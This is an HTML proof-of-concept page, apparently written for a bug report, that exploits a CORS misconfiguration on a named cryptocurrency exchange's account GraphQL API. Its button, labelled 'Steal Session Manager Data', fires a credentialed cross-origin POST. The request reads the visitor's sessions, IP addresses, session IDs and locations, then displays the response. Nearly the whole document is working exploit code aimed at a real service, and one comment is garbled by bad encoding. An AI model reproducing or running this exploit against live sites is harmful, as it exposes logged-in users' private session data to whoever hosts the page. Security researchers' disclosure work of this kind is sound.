<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CORS GraphQL PoC</title>
</head>
<body>

<h2>CORS Misconfiguration ‚Äì GraphQL POST</h2>
<button id="run">Steal Session Manager Data</button>
<pre id="out">Click the button‚Ä¶</pre>

<script>
document.getElementById("run").onclick = function () {

  const target = "https://profile.cex.io/account-api/graphql";
  const out = document.getElementById("out");

  out.textContent = "Sending authenticated GraphQL POST request...\n";

  const xhr = new XMLHttpRequest();
  xhr.open("POST", target, true);

  // üî• ÿßŸÑŸÜŸÇÿ∑ÿ© ÿßŸÑÿ£ÿ≥ÿßÿ≥Ÿäÿ© ŸÅŸÄ CORS
  xhr.withCredentials = true;

  xhr.setRequestHeader("Content-Type", "application/json");

  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4) {
      out.textContent =
        "STATUS: " + xhr.status + " " + xhr.statusText + "\n\n" +
        "RESPONSE HEADERS:\n" +
        xhr.getAllResponseHeaders() + "\n\n" +
        "RESPONSE BODY:\n" +
        xhr.responseText;

      console.log("CORS GraphQL PoC response:", xhr.responseText);
    }
  };

  const body = JSON.stringify({
    query: `
    {
        sessionManager {
            device
            deviceType
            ip
            lastActiveTime
            sessionId
            isCurrent
            location
        }
    }`
  });

  xhr.send(body);
};
</script>

</body>
</html>
